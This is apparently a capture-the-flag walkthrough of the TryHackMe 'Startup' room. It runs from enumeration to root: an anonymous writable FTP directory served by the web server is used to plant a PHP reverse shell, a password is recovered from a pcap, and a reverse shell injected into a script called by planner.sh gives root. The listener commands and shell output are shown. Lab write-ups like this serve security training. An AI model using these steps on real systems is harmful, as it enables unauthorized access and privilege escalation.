An easy room with easy privilege escalation technique

Starting with the machine enumeration

```
┌──(kali㉿kali)-[~/Desktop/THM/Startup]
└─$ sudo nmap -sS 10.10.161.131 > open_ports.txt     
[sudo] password for kali: 
                                                                                                                                                 
┌──(kali㉿kali)-[~/Desktop/THM/Startup]
└─$ cat open_ports.txt 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-10 11:13 IST
Nmap scan report for 10.10.161.131
Host is up (0.43s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 4.66 seconds
```

```
┌──(kali㉿kali)-[~/Desktop/THM/Startup]
└─$ sudo nmap -sS -sV -sC -O -Pn -p21,22,80 10.10.161.131 > ports_scan.txt
                                                                                                                                                 
┌──(kali㉿kali)-[~/Desktop/THM/Startup]
└─$ cat ports_scan.txt 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-10 11:14 IST
Nmap scan report for 10.10.161.131
Host is up (0.42s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.4.101.169
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Maintenance
|_http-server-header: Apache/2.4.18 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 5.4 (98%), Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (93%), Sony Android TV (Android 5.0) (93%), Android 5.0 - 6.0.1 (Linux 3.4) (93%), Android 7.1.1 - 7.1.2 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.83 seconds
```

FTP, with anonymous login allowed, SSH, waste of time without any key, or password, and HTTP.

Logging to the FTP server
```
┌──(kali㉿kali)-[~/Desktop/THM/Startup]
└─$ ftp 10.10.161.131 -a
Connected to 10.10.161.131.
220 (vsFTPd 3.0.3)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||16893|)
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
-rw-r--r--    1 0        0               5 Nov 12  2020 .test.log
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
```

The JPG is an Among Us meme, the 'ftp' directory is empty, and the notice.txt is, I think, by the admin.

Also, fuzzing the IP:
```
┌──(kali㉿kali)-[~/Desktop/THM/Startup]
└─$ ffuf -u http://10.10.161.131/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.161.131/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 2064ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 5065ms]
files                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 452ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 461ms]
:: Progress: [20476/20476] :: Job [1/1] :: 93 req/sec :: Duration: [0:03:47] :: Errors: 0 ::
```

The 'files' sub-directory contains the same files as the FTP server. This means the files directory is the FTP server. Uploading anything to the FTP server can be accessed from the website. I will be uploading
a PHP reverse shell to get a reverse shell on my terminal

```
ftp> cd ftp
250 Directory successfully changed.
ftp> put php_reverse_shell.php
local: php_reverse_shell.php remote: php_reverse_shell.php
229 Entering Extended Passive Mode (|||46360|)
150 Ok to send data.
100% |****************************************************************************************************|  3462       38.39 MiB/s    00:00 ETA
226 Transfer complete.
3462 bytes sent in 00:00 (3.87 KiB/s)
```

<img src=https://github.com/user-attachments/assets/122b67e1-bbcc-4c3a-be7f-a324d14fde6c>

I uploaded it to the empty ftp directory.

```
┌──(kali㉿kali)-[~/Desktop/THM/Startup]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.4.101.169] from (UNKNOWN) [10.10.161.131] 47216
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 06:01:10 up 19 min,  0 users,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

There is an 'incidents' folder in the root directory that contains a PCAP file.

```
$ cd incidents
$ ls 
suspicious.pcapng
```

I copied the PCAP file to `/var/www/html/file/ftp`, where the reverse shell is uploaded, and downloaded the PCAP file to my machine.

I then used the 'strings' command to read the PCAP file in the terminal and found a password.

```
[sudo] password for www-data: 
^/Sorry, try again.
[sudo] password for www-data: 
c4ntg3t3n0ughsp1c3
sudo: 3 incorrect password attempts
www-data@startup:/home$ |
```

I tried this password with the current user; it was not this user's password. So I tried it with the user "Lennie"

```
www-data@startup:/incidents$ su lennie
su lennie
Password:

lennie@startup:/incidents$
```

Before this, I did have to stabilise the shell, which I did using Python.

Under the Lennie directory, there is a directory named 'scripts'. The root owns this directory, but Lennie has the read and execute permission.

```
lennie@startup:~/scripts$ ls
ls
planner.sh  startup_list.txt
lennie@startup:~/scripts$ cat startup_list.txt
cat startup_list.txt

lennie@startup:~/scripts$ cat planner.sh
cat planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
lennie@startup:~/scripts$ cat /etc/print.sh
cat /etc/print.sh
#!/bin/bash
echo "Done!"


lennie@startup:~/scripts$ ls -l /etc/print.sh
ls -l /etc/print.sh
-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh
```

The planner.sh will copy whatever is in the LIST env variable to the startup_list.txt file and execute the print.sh file. I added a reverse bash shell in the print.sh file, opened a NetCat listener on my machine, and 
then executed the planner.sh file and gained the root shell

```
┌──(kali㉿kali)-[~/Desktop/THM/Startup]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.4.101.169] from (UNKNOWN) [10.10.161.131] 48320
bash: cannot set terminal process group (20652): Inappropriate ioctl for device
bash: no job control in this shell
root@startup:~# whoami
whoami
root
```
